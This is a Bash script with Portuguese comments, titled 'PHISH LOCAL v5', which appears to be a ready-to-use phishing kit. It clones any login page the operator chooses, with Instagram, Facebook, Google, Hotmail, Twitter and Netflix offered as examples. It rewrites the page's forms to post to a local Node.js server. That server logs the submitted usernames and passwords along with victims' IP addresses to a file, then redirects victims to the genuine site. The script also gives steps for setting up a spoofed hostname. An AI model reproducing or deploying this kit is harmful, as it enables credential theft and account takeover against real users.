#!/bin/bash
# ============================================
# 🎣 PHISH LOCAL v5 - Universal
# Clona QUALQUER site de login
# Sem root | Sem dominio pago
# ============================================

SITE_DIR="site_clone"
LOG_FILE="capturas.txt"
SERVER_FILE="server/server.js"
mkdir -p "$SITE_DIR" server

# Verificar node
if ! command -v node &>/dev/null; then
    echo "[!] Node.js nao encontrado."
    echo "    Rode: pkg install nodejs -y"
    exit 1
fi

clear
echo ""
echo "=========================================="
echo "     PHISH LOCAL v5 - Universal"
echo "=========================================="
echo ""
echo "  1) Criar phishing"
echo "  2) Ver capturas"
echo "  3) Limpar site"
echo "  4) Sair"
echo ""
echo -n "Escolha: "
read MENU

if [ "$MENU" = "1" ]; then

    echo ""
    echo "=========================================="
    echo "  CONFIGURAR PHISHING"
    echo "=========================================="
    echo ""
    echo "Qual site de login voce quer clonar?"
echo "  - https://www.instagram.com"
echo "  - https://www.facebook.com"
echo "  - https://accounts.google.com"
echo "  - https://login.live.com (Hotmail)"
echo "  - https://twitter.com/i/flow/login"
echo "  - https://www.netflix.com/login"
echo "  - Ou QUALQUER outro site de login"
echo ""
echo -n "URL do site: "
read TARGET_URL
[ -z "$TARGET_URL" ] && echo "URL vazia!" && exit 1
[[ ! "$TARGET_URL" =~ ^https?:// ]] && TARGET_URL="https://$TARGET_URL"

echo ""
echo "Que nome voce quer pro link local?"
echo "  Ex: instagram.local, fb-login.com, gmail.net"
echo -n "Nome: "
read LOCAL_NAME
[ -z "$LOCAL_NAME" ] && LOCAL_NAME="login"

echo ""
echo "Porta [8080]: "
echo -n "> "
read PORT
[ -z "$PORT" ] && PORT=8080

echo ""
echo "Redirecionar pra onde depois do login?"
echo -n "URL: "
read REDIRECT_URL
[ -z "$REDIRECT_URL" ] && REDIRECT_URL="$TARGET_URL"
[[ ! "$REDIRECT_URL" =~ ^https?:// ]] && REDIRECT_URL="https://$REDIRECT_URL"

# --- CLONAR SITE ---
clear
echo ""
echo "[...] Clonando $TARGET_URL"
echo ""
rm -rf "$SITE_DIR"/*

# Baizar pagina principal
curl -s -L -o "$SITE_DIR/index.html" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
    -H "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8" \
    "$TARGET_URL" 2>/dev/null

# Verificar se baixou
if [ ! -f "$SITE_DIR/index.html" ] || [ $(wc -c < "$SITE_DIR/index.html") -lt 100 ]; then
    echo "[AVISO] Nao foi possivel clonar. Usando pagina generica."
    touch "$SITE_DIR/index.html"
fi

# Baizar CSS
echo "[...] Baixando CSS..."
for css in $(grep -oE 'href="[^"]*\.css"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//'); do
    fname=$(basename "$css")
    [ -f "$SITE_DIR/$fname" ] && continue
    if [[ "$css" == http* ]]; then
        curl -s -L -o "$SITE_DIR/$fname" "$css" 2>/dev/null
    elif [[ "$css" == /* ]]; then
        BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
        curl -s -L -o "$SITE_DIR/$fname" "$BASE$css" 2>/dev/null
    fi
done

# Baizar JS
echo "[...] Baixando JS..."
for js in $(grep -oE 'src="[^"]*\.js"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
    fname=$(basename "$js")
    [ -f "$SITE_DIR/$fname" ] && continue
    if [[ "$js" == http* ]]; then
        curl -s -L -o "$SITE_DIR/$fname" "$js" 2>/dev/null
    elif [[ "$js" == /* ]]; then
        BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
        curl -s -L -o "$SITE_DIR/$fname" "$BASE$js" 2>/dev/null
    fi
done

# Baizar imagens
echo "[...] Baixando imagens..."
for img in $(grep -oE 'src="[^"]*\.(png|jpg|jpeg|gif|svg|webp)"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
    fname=$(basename "$img")
    [ -f "$SITE_DIR/$fname" ] && continue
    if [[ "$img" == http* ]]; then
        curl -s -L -o "$SITE_DIR/$fname" "$img" 2>/dev/null
    elif [[ "$img" == /* ]]; then
        BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
        curl -s -L -o "$SITE_DIR/$fname" "$BASE$img" 2>/dev/null
    fi
done

# Modificar formularios para captura
echo "[...] Configurando captura..."
sed -i 's/<form/<form method="POST" action="\/login"/gi' "$SITE_DIR/index.html"
sed -i 's/action="[^"]*"/action="\/login"/gi' "$SITE_DIR/index.html"

echo ""
echo "[OK] Site clonado!"
ls "$SITE_DIR"/*.html "$SITE_DIR"/*.css 2>/dev/null | head -10

# --- CRIAR SERVIDOR ---
cat > "$SERVER_FILE" << 'EOF'
const http=require('http'),fs=require('fs'),path=require('path');
const PORT=process.env.PORT||8080;
const SITE_DIR=process.env.SITE_DIR||'site_clone';
const LOG_FILE=process.env.LOG_FILE||'capturas.txt';
const REDIRECT=process.env.REDIRECT||'https://instagram.com';
const MIME={'.html':'text/html','.css':'text/css','.js':'application/javascript','.png':'image/png','.jpg':'image/jpeg','.jpeg':'image/jpeg','.gif':'image/gif','.svg':'image/svg+xml','.ico':'image/x-icon','.webp':'image/webp','.woff':'font/woff','.woff2':'font/woff2','.ttf':'font/ttf','.json':'application/json'};

function saveCapture(body,ip){
    try{
        const p=new URLSearchParams(body);
        const d={};
        for(let[k,v]of p.entries())d[k]=v;
        const ts=new Date().toISOString().replace('T',' ').split('.')[0];
        const log='['+ts+'] IP:'+ip+' '+JSON.stringify(d);
        fs.appendFileSync(LOG_FILE,log+'\n');
        console.log('\n[CAPTURADO] '+log);
    }catch(e){}
}

http.createServer((req,res)=>{
    const ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    if(req.method==='POST'){
        let b='';
        req.on('data',c=>b+=c);
        req.on('end',()=>{
            saveCapture(b,ip);
            res.writeHead(302,{'Location':REDIRECT});
            res.end();
        });
        return;
    }
    let f=req.url==='/'?'/index.html':req.url.split('?')[0];
    f=path.join(SITE_DIR,f);
    const ext=path.extname(f).toLowerCase();
    fs.readFile(f,(er,d)=>{
        if(er){
            res.writeHead(200,{'Content-Type':'text/html'});
            res.end('<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">\n<meta name="viewport" content="width=device-width,initial-scale=1.0">\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\nbody{font-family:-apple-system,BlinkMacSystemFont:"Segoe UI",Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}\n.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 45px;width:350px;text-align:center}\nh1{font-size:44px;font-weight:300;margin-bottom:30px;font-family:"Segoe UI",sans-serif}\ninput{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;background:#fafafa;outline:none;box-sizing:border-box}\ninput:focus{border-color:#a8a8a8}\nbutton{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}\nbutton:active{background:#1877f2}\n</style></head><body>\n<div class="card"><h1>Login</h1>\n<form method="POST"action="/login">\n<input type="text" name="username" placeholder="Usuario ou email" required>\n<input type="password" name="password" placeholder="Senha" required>\n<button type="submit">Entrar</button>\n</form></div></body></html>');
            return;
        }
        res.writeHead(200,{'Content-Type':MIME[ext]||'application/octet-stream'});
        res.end(d);
    });
}).listen(PORT,'0.0.0.0',()=>console.log('Servidor ativo porta '+PORT));
EOF

# --- OBTER IP ---
IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
[ -z "$IP" ] && IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
[ -z "$IP" ] && IP="127.0.0.1"

# --- MOSTRAR RESULTADO ---
clear
echo ""
echo "=========================================="
echo "         SERVIDOR PRONTO!"
echo "=========================================="
echo ""
echo "  URL: http://${IP}:${PORT}"
echo ""
echo "  Para URL customizada no PC:"
echo "  Edite: C:\\Windows\\System32\\drivers\\etc\\hosts"
echo "  Adicione: ${IP}  ${LOCAL_NAME}"
echo "  Acesse: http://${LOCAL_NAME}:${PORT}"
echo ""
echo "  Parar: Ctrl+C"
echo ""
echo "[*] Iniciando servidor..."
echo ""

REDIRECT="$REDIRECT_URL" PORT="$PORT" node "$SERVER_FILE"

echo ""
echo "[*] Servidor parado."
echo ""
echo -n "Ver capturas? (s/n): "
read V
echo ""
if [ "$V" = "s" ] || [ "$V" = "S" ]; then
    if [ -f "$LOG_FILE" ] && [ -s "$LOG_FILE" ]; then
        echo "=========================================="
        cat "$LOG_FILE"
        echo "=========================================="
    else
        echo "Nenhuma captura ainda."
    fi
fi

elif [ "$MENU" = "2" ]; then
    echo ""
    if [ -f "$LOG_FILE" ] && [ -s "$LOG_FILE" ]; then
        echo "=========================================="
        cat "$LOG_FILE"
        echo "=========================================="
    else
        echo "Nenhuma captura."
    fi

elif [ "$MENU" = "3" ]; then
    rm -rf "$SITE_DIR"/*
    echo "[OK] Site removido."

elif [ "$MENU" = "4" ]; then
    exit 0

else
    echo "Opcao invalida!"
fi
